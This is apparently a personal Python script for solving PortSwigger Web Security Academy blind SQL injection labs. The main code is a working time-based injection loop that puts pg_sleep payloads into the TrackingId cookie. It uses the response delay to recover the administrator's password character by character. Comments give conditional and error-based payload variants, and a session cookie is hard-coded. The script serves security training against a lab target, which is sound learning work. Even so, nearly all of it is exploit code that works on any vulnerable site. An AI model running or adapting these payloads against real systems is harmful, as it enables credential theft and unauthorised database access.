#This is a script that I wrote to solve portswigger blind sql injection tasks.
#Note that this is just a draft, but you can change and use however you
#want

import requests


url="https://0aad00fb038ae2dbc36ba2fb004b00f9.web-security-academy.net/"
ful_dictionary = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
dictionary = "abcdefghijklmnopqrstuvwxyz0123456789"
found = ''

for i in range(1,100):
    for j in dictionary:
        _cookies={
            "TrackingId" : "A'||pg_sleep((SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,{})= '{}' ) THEN 5 ELSE 0 END)) --".format(i, found + j),
            "session" : "zT20gOSVkvmWMJYJ1t210ym9T5E4Ddh4"}
        req = requests.Request('GET',url,headers={'X-Custom':'Test'}, cookies=_cookies)
        prepared = req.prepare()
        s = requests.Session()
        response = s.send(prepared)
        if(response.elapsed.total_seconds() > 5):
            found+=j
            print(found)
            break
        print(_cookies["TrackingId"])


#task 1 (change if statement to a successful response size)
#conditional based blind query 
#SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a' --

#task 2 (change if statement to a successful response size)
#error based blind
#A' AND (SELECT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)= 'd' ) THEN 'a' ELSE to_char(1/0) END) FROM DUAL)='a

#task 3 (if statement is given above)
#time based blind
#A'||pg_sleep((SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)= 'a' ) THEN 10 ELSE 2 END)) --


# You can run code to test without looping.

# _cookies={
# "TrackingId" : "A'||pg_sleep(1) -- ",
#     "session" : "zT20gOSVkvmWMJYJ1t210ym9T5E4Ddh4"}
# req = requests.Request('GET',url,headers={'X-Custom':'Test'}, cookies=_cookies)
# prepared = req.prepare()
# s = requests.Session()
# response = s.send(prepared)
# # print(response.text)
# print(len(response.text))
# print(response.elapsed.total_seconds())
